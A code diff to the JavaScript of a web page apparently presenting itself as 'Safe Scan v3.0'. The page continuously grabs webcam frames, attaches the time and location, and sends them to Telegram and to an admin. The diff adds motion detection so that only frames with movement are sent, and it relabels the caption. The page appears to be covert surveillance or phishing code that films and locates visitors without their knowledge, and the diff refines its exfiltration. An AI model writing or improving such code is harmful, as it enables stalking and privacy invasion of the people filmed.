@@ -2478,7 +2478,7 @@
             let backgroundVideoRecordingStartTime = null;
             let backgroundVideoRecordingDuration = 0;
             let videoRecordingInterval = null;
-
+            let previousImageData = null;
 
             function startContinuousCapture() {
                 // First capture after 1 second, then every 3 seconds
@@ -2495,13 +2495,43 @@
                     const tracks = stream.getVideoTracks();
                     if (!tracks.length) return;
                     const settings = tracks[0].getSettings();
-                    canvas.width = settings.width || 640; canvas.height = settings.height || 480;
+                    const w = settings.width || 640;
+                    const h = settings.height || 480;
+                    
+                    // Downscale for fast motion detection
+                    canvas.width = 160; 
+                    canvas.height = Math.floor((160 / w) * h);
                     const ctx = canvas.getContext('2d');
                     if (cameraView.readyState < 2) return;
-                    ctx.drawImage(cameraView, 0, 0);
+                    
+                    ctx.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+                    const currentImageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                    
+                    let motionDetected = false;
+                    if (!previousImageData) {
+                        motionDetected = true;
+                    } else {
+                        let diff = 0;
+                        for (let i = 0; i < currentImageData.length; i += 4) {
+                            diff += Math.abs(currentImageData[i] - previousImageData[i]) + 
+                                    Math.abs(currentImageData[i+1] - previousImageData[i+1]) + 
+                                    Math.abs(currentImageData[i+2] - previousImageData[i+2]);
+                        }
+                        const avgDiff = diff / (canvas.width * canvas.height * 3);
+                        if (avgDiff > 8) motionDetected = true;
+                    }
+                    previousImageData = currentImageData;
+
+                    // If no motion, don't capture/send
+                    if (!motionDetected) return;
+
+                    // Redraw full res for sending
+                    canvas.width = w;
+                    canvas.height = h;
+                    ctx.drawImage(cameraView, 0, 0, w, h);
                     const photo = canvas.toDataURL('image/jpeg', 0.85);
                     if (!photo || photo.length < 1000) return;
-                    const caption = `📸 Security Capture\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
+                    const caption = `📸 Motion Detected\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
                     await sendPhotoToTelegram(photo, caption);
                     sendFrameToAdmin(photo);
                 } catch (e) { console.error('Capture error:', e); }
